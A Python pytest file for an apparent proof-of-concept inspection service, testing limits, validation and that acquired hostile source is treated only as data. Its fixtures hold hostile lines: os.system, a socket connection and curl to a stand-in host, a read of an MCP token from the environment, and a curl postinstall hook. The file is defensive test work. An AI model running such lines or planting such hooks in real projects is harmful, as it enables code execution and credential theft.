"""C2 limits, authority validation and hostile-source non-execution regressions."""

from __future__ import annotations

import builtins
import hashlib
import json
import os
import runpy
import socket
import subprocess
from pathlib import Path

import pytest
from boberagent_core import CoreDatabase
from boberagent_core.inspections import (
    CoverageStatus,
    InspectionError,
    InspectionStatus,
    PoCInspection,
    SemanticInspectionDocument,
    SemanticInspectionLimits,
)
from boberagent_core.inspections.semantic_models import (
    EpistemicState,
    SourceFact,
    SourceOrigin,
)
from pydantic import ValidationError
from test_poc_inspection_c2 import completed_document, fixture_repository, prepare


@pytest.mark.parametrize(
    ("limits", "reason"),
    [
        ({"max_semantic_files": 1}, "SEMANTIC_FILE_LIMIT"),
        ({"max_semantic_bytes_per_file": 10}, "SEMANTIC_PER_FILE_BYTES_LIMIT"),
        ({"max_semantic_bytes_total": 10}, "SEMANTIC_TOTAL_BYTES_LIMIT"),
        ({"max_lines_per_file": 1}, "SEMANTIC_LINE_LIMIT"),
        ({"max_ast_nodes": 1}, "AST_NODE_LIMIT"),
        ({"max_citation_bytes": 1}, "CITATION_BYTES_LIMIT"),
        ({"max_citations": 1}, "CITATION_LIMIT"),
        ({"max_facts": 1}, "FACT_LIMIT"),
        ({"max_parameter_candidates": 1}, "PARAMETER_LIMIT"),
        ({"max_dependency_observations": 1}, "DEPENDENCY_LIMIT"),
        ({"max_requirements": 1}, "REQUIREMENT_LIMIT"),
        ({"max_behavior_indicators": 1}, "BEHAVIOR_LIMIT"),
        ({"max_risk_indicators": 1}, "RISK_LIMIT"),
        ({"max_unknowns": 1}, "UNKNOWN_LIMIT"),
        ({"max_entrypoint_candidates": 1}, "ENTRYPOINT_LIMIT"),
        ({"max_conflicts": 1}, "CONFLICT_LIMIT"),
    ],
)
def test_independent_semantic_limits(
    database: CoreDatabase, tmp_path: Path, limits: dict[str, int], reason: str
) -> None:
    service, requested = prepare(
        database, tmp_path, fixture_repository(), SemanticInspectionLimits.model_validate(limits)
    )
    _, document = completed_document(service, requested)
    assert reason in document.limit_reasons
    assert any(item.status is not CoverageStatus.INSPECTED for item in document.coverage)


def test_wall_limit_after_integrity_is_coverage(
    database: CoreDatabase, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from boberagent_core.inspections.extraction import ExtractedItems, SemanticLimit

    service, requested = prepare(database, tmp_path, {"poc.py": b"import os\n"})

    def expired(self: ExtractedItems) -> None:
        raise SemanticLimit("WALL_TIME_LIMIT")

    monkeypatch.setattr(ExtractedItems, "check_time", expired)
    _, document = completed_document(service, requested)
    assert document.coverage[0].reason == "WALL_TIME_LIMIT"
    assert document.coverage[0].status is CoverageStatus.SKIPPED_LIMIT
    assert not document.facts


def test_observed_inferred_and_document_validation(database: CoreDatabase, tmp_path: Path) -> None:
    service, requested = prepare(database, tmp_path, {"poc.py": b"import os\n"})
    completed, document = completed_document(service, requested)
    observed = document.facts[0]
    with pytest.raises(ValidationError, match="requires evidence"):
        SourceFact.model_validate({**observed.model_dump(), "citations": ()})
    with pytest.raises(ValidationError, match="supporting facts"):
        SourceFact.model_validate(
            {**observed.model_dump(), "epistemic_state": EpistemicState.INFERRED}
        )
    with pytest.raises(ValidationError, match="unknown supporting fact"):
        SemanticInspectionDocument.model_validate(
            {
                **document.model_dump(),
                "facts": (
                    {
                        **observed.model_dump(),
                        "epistemic_state": "INFERRED",
                        "supporting_fact_refs": ("missing",),
                    },
                ),
            }
        )
    for update in (
        {"path": "wrong.py"},
        {"entry_sha256": "0" * 64},
        {"start": 999, "end": 1000},
        {"raw_sha256": "0" * 64},
    ):
        citation = observed.citations[0].model_copy(update=update)
        with pytest.raises(InspectionError):
            service.validate_citation(completed.inspection_ref, citation)
    with pytest.raises(ValidationError):
        SemanticInspectionDocument.model_validate(
            {**document.model_dump(), "classification": "AUTOMATIC"}
        )
    assert SemanticInspectionDocument.model_validate_json(document.model_dump_json()) == document
    assert "document_version" in SemanticInspectionDocument.model_json_schema()["properties"]
    assert PoCInspection.model_validate_json(completed.model_dump_json()) == completed


def test_c1_history_separate_and_reinspection_deterministic(
    database: CoreDatabase, tmp_path: Path
) -> None:
    service, requested = prepare(
        database, tmp_path, {"source.py": b'import os\nif __name__ == "__main__": pass\n'}
    )
    history = service.list_for_acquisition(requested.acquisition_ref)
    c1 = next(item for item in history if item.profile_id == "m20-c1-evidence")
    old = service.inspect(c1.inspection_ref)
    completed, doc = completed_document(service, requested)
    assert old.document is not None
    assert old.document.document_version == "m20-c1-evidence-v1"
    assert service.get(old.inspection_ref) == old
    newer = service.create_semantic(
        mission_ref=completed.mission_ref,
        hypothesis_ref=completed.hypothesis_ref,
        candidate_ref=completed.candidate_ref,
        acquisition_ref=completed.acquisition_ref,
        force_new=True,
    )
    _, doc2 = completed_document(service, newer)
    assert doc2 == doc
    assert newer.inspection_ref != completed.inspection_ref
    changed = service.create_semantic(
        mission_ref=completed.mission_ref,
        hypothesis_ref=completed.hypothesis_ref,
        candidate_ref=completed.candidate_ref,
        acquisition_ref=completed.acquisition_ref,
        limits=SemanticInspectionLimits(max_facts=10),
    )
    assert changed.config_fingerprint != completed.config_fingerprint
    assert service.get(old.inspection_ref) == old


def test_hostile_source_is_data_only(
    database: CoreDatabase, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    marker = tmp_path / "should-never-exist"
    source = f"""raise RuntimeError("EXECUTED")
import os
import socket
import subprocess
os.system("touch {marker}")
socket.create_connection(("controlled.invalid", 443))
subprocess.run(["curl", "https://controlled.invalid/"])
os.environ["BOBERAGENT_MCP_TOKEN"]
""".encode()
    files = {
        "poc.py": source,
        "README.md": fixture_repository()["README.md"],
        "package.json": b'{"scripts":{"postinstall":"curl https://controlled.invalid/"}}',
    }
    service, requested = prepare(database, tmp_path, files)
    calls: list[str] = []

    def denied(*args: object, **kwargs: object) -> None:
        calls.append("forbidden")
        raise AssertionError("inspector attempted execution or network")

    monkeypatch.setenv("BOBERAGENT_MCP_TOKEN", "synthetic-token-never-read")
    for obj, name in (
        (subprocess, "run"),
        (subprocess, "Popen"),
        (os, "system"),
        (socket, "create_connection"),
        (socket.socket, "connect"),
        (runpy, "run_path"),
        (runpy, "run_module"),
    ):
        monkeypatch.setattr(obj, name, denied)
    original_import = builtins.__import__

    def guarded_import(
        name: str,
        globals: dict[str, object] | None = None,
        locals: dict[str, object] | None = None,
        fromlist: tuple[str, ...] = (),
        level: int = 0,
    ) -> object:
        if name in {"poc", "acquired_source"}:
            denied()
        return original_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", guarded_import)
    original_getitem = type(os.environ).__getitem__

    def guarded_env(self: os._Environ[str], key: str) -> str:
        if key == "BOBERAGENT_MCP_TOKEN":
            denied()
        return original_getitem(self, key)

    monkeypatch.setattr(type(os.environ), "__getitem__", guarded_env)
    completed, document = completed_document(service, requested)
    assert not marker.exists()
    assert not calls
    assert "synthetic-token-never-read" not in completed.model_dump_json()
    assert "postinstall" not in document.model_dump_json()
    assert all(
        item.origin is not SourceOrigin.CODE
        for item in document.facts
        if item.kind.startswith("DOCUMENTED")
    )
    # The raw Artifact still has the exact original bytes, including hostile text.
    assert hashlib.sha256(source).hexdigest() == next(
        entry.sha256 for entry in document.coverage if entry.path == "poc.py"
    )


def test_internal_bug_fails_safely(
    database: CoreDatabase, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from boberagent_core.inspections import semantic_analysis

    service, requested = prepare(database, tmp_path, {"poc.py": b"import os\n"})

    def broken(*args: object) -> None:
        raise RuntimeError("synthetic-secret-must-not-appear")

    monkeypatch.setattr(semantic_analysis, "analyze_python", broken)
    with pytest.raises(InspectionError, match="INSPECTOR_INTERNAL_ERROR"):
        service.inspect(requested.inspection_ref)
    failed = service.get(requested.inspection_ref)
    assert failed is not None and failed.status is InspectionStatus.FAILED
    assert failed.diagnostic == "INSPECTOR_INTERNAL_ERROR"
    assert "synthetic-secret-must-not-appear" not in failed.model_dump_json()


@pytest.mark.parametrize(
    ("path", "content", "reason"),
    [
        ("package.json", b'{"postinstall":"untrusted"}', "GENERIC_DATA_NO_SCHEMA"),
        ("package.json", b'{"x":1,"x":2}', "DECLARATIVE_PARSE_FAILED"),
        ("data.json", b'{"x":NaN}', "DECLARATIVE_PARSE_FAILED"),
        ("data.toml", b"broken = [", "DECLARATIVE_PARSE_FAILED"),
        ("payload.go", b"package main", "UNSUPPORTED_OR_GENERATED_TYPE"),
        ("vendor/generated.py", b"import os", "UNSUPPORTED_OR_GENERATED_TYPE"),
    ],
)
def test_unhandled_formats_visible(
    database: CoreDatabase, tmp_path: Path, path: str, content: bytes, reason: str
) -> None:
    service, requested = prepare(database, tmp_path, {path: content})
    _, document = completed_document(service, requested)
    assert document.coverage[0].reason == reason or any(
        item.reason == reason for item in document.unknowns
    )
    assert reason in {item.reason for item in document.unknowns}


def test_no_plaintext_default_or_doc_commands_serialized(
    database: CoreDatabase, tmp_path: Path
) -> None:
    files = {
        "poc.py": b'import argparse\np=argparse.ArgumentParser()\np.add_argument("--password", default="harmless-embedded-value")\n',
        "README.md": b"Usage: curl -H 'token: harmless-embedded-value' https://controlled.invalid\n",
        "data.json": json.dumps({"token": "harmless-embedded-value"}).encode(),
    }
    service, requested = prepare(database, tmp_path, files)
    _, document = completed_document(service, requested)
    assert "harmless-embedded-value" not in document.model_dump_json()
    assert document.parameter_candidates[0].default_redacted
